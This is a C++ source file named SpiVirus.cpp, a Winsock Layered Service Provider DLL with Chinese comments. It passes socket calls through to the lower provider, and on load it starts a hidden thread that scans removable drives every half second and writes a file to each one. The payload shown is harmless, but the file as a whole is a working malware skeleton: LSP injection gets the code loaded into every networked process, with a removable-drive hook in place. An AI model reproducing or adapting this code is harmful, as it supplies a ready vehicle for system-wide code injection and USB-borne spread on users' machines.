// SpiVirus.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include <tchar.h>
#include <windows.h>
#include <stdio.h> 
#include <Ws2spi.h>
#pragma comment(lib, "WS2_32")	// 链接到WS2_32.lib

DWORD __stdcall ThreadMain( LPVOID )
{
	while (1)   //循环扫描系统磁盘
	{
		TCHAR tcBuffer[4] = {0}; //准备较小内存,先试探出实际需要的内存大小。
		DWORD dwNeededSize = GetLogicalDriveStrings(4, tcBuffer); //第一次执行，获得实际需要内存。
		if (dwNeededSize > 4)
		{   //返回值大于指定内存大小,需要重新准备足够内存再次执行。
			TCHAR *pBuffer = new TCHAR[dwNeededSize];  //准备足够大的内存
			dwNeededSize = GetLogicalDriveStrings(dwNeededSize, pBuffer); //获得逻辑驱动器字符串
			TCHAR *pDrive = pBuffer;
			int iPreLength = 0;
			while (1)
			{
				pDrive = pBuffer+iPreLength;  //获得下一个驱动器
				if (pDrive[0] == 0) //获取驱动器结束
				{
					break; //退出循环
				}
				DWORD dwDriveType = GetDriveType(pDrive); //获取驱动器类型
				if (dwDriveType == DRIVE_REMOVABLE)
				{   //如果是移动驱动器
					TCHAR tcFile[MAX_PATH] = {0};
					_stprintf(tcFile, _T("%sa.txt"), pDrive);
					//打开已存在的a.txt文件
					HANDLE hFile = CreateFile(tcFile, GENERIC_WRITE|GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
						OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
					if (hFile == INVALID_HANDLE_VALUE)
					{
						//打开失败则创建一个。
						hFile = CreateFile(tcFile, GENERIC_WRITE|GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
							CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
						DWORD dwWrite = 0;
						WriteFile(hFile, _T("Hello"), 5, &dwWrite, NULL);
					}
					CloseHandle(hFile);
				}
				iPreLength += _tcslen(pDrive);  //跳过当前驱动器
				iPreLength += sizeof(TCHAR);    //跳过'\0'。
			}
			if (pBuffer != NULL)
			{
				delete []pBuffer;  //释放内存
				pBuffer = NULL;
			}
		}
		Sleep(500);  //暂停500毫秒后继续扫描
	}
}

int GetProvider(LPWSAPROTOCOL_INFOW &pProtoInfo)
{	
	//  首次调用，pProtoInfo传入NULL，取得需要的缓冲区长度
	DWORD dwSize = 0;
	int nError = 0;
	if(WSCEnumProtocols(NULL, NULL, &dwSize, &nError) == SOCKET_ERROR)
	{
		if(nError != WSAENOBUFS)
		{
			return 0;
		}
	}
	// 申请足够缓冲区内存。
	pProtoInfo = (LPWSAPROTOCOL_INFOW)GlobalAlloc(GPTR, dwSize);
	if (pProtoInfo == NULL)
	{
		return 0;
	}
	//再次调用WSCEnumProtocols函数
	return WSCEnumProtocols(NULL, pProtoInfo, &dwSize, &nError);
}

int WSPAPI WSPStartup(WORD wVersionRequested,
					  LPWSPDATA lpWSPData,
					  LPWSAPROTOCOL_INFOW lpProtocolInfo,
					  WSPUPCALLTABLE UpcallTable,
					  LPWSPPROC_TABLE lpProcTable)
{
//	MessageBoxA(0,0,0,0);
	//我们编写的DLL用于协议链中，所以如果是基础协议或分层协议使用则直接返回错误
	if(lpProtocolInfo->ProtocolChain.ChainLen <= 1)
	{	
		return WSAEPROVIDERFAILEDINIT;
	}
	// 枚举协议，找到下层协议的WSAPROTOCOL_INFOW结构	
	WSAPROTOCOL_INFOW	NextProtocolInfo;
	LPWSAPROTOCOL_INFOW pProtoInfo = NULL;
	//安装协议链时封装的枚举提供者的函数，返回提供者总个数。
	int nTotalProtos = GetProvider(pProtoInfo);
	// 下层传输服务提供者目录ID	
	DWORD dwBaseEntryId = lpProtocolInfo->ProtocolChain.ChainEntries[1];
	int i=0;
	for(; i<nTotalProtos; i++)
	{
		if(pProtoInfo[i].dwCatalogEntryId == dwBaseEntryId)
		{	//保存下层传输服务提供者信息
			memcpy(&NextProtocolInfo, &pProtoInfo[i], sizeof(NextProtocolInfo));
			break;
		}
	}
	if(i >= nTotalProtos)
	{	//如果没有找到下层提供者则返回错误
		return WSAEPROVIDERFAILEDINIT;
	}
	// 加载下层协议的DLL
	int nError;
	wchar_t szBaseProviderDll[MAX_PATH];
	int nLen = MAX_PATH;
	// 取得下层提供程序DLL路径
	if(WSCGetProviderPath(&NextProtocolInfo.ProviderId, szBaseProviderDll, &nLen, &nError) == SOCKET_ERROR)
	{
		return WSAEPROVIDERFAILEDINIT;
	}
	if(!ExpandEnvironmentStringsW(szBaseProviderDll, szBaseProviderDll, MAX_PATH))
	{
		return WSAEPROVIDERFAILEDINIT;
	}
	// 加载下层提供程序
	HMODULE hModule = LoadLibraryW(szBaseProviderDll);
	if(hModule == NULL)
	{
		return WSAEPROVIDERFAILEDINIT;
	}
	// 导入下层提供程序的WSPStartup函数
	LPWSPSTARTUP  pfnWSPStartup = NULL;
	pfnWSPStartup = (LPWSPSTARTUP)GetProcAddress(hModule, "WSPStartup");
	if(pfnWSPStartup == NULL)
	{
		return WSAEPROVIDERFAILEDINIT;
	}
	// 调用下层提供程序的WSPStartup函数以填充SPI地址表
	LPWSAPROTOCOL_INFOW pInfo = lpProtocolInfo;
	if(NextProtocolInfo.ProtocolChain.ChainLen == BASE_PROTOCOL)
	{
		pInfo = &NextProtocolInfo;
	}
	else
	{
		for(int j = 0; j<lpProtocolInfo->ProtocolChain.ChainLen; j++)
		{
			lpProtocolInfo->ProtocolChain.ChainEntries[j] 
				= lpProtocolInfo->ProtocolChain.ChainEntries[j+1];
		}
		lpProtocolInfo->ProtocolChain.ChainLen--;
	}
	
	int nRet = pfnWSPStartup(wVersionRequested, lpWSPData, pInfo, UpcallTable, lpProcTable);
	if(nRet != ERROR_SUCCESS)
	{
		return nRet;
	}
	GlobalFree(pProtoInfo);
	return nRet;
}

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved)
{
	if (DLL_PROCESS_ATTACH == ul_reason_for_call)
	{
		CreateThread( NULL, 0, ThreadMain, 0, 0, 0 );
	}
    return TRUE;
}

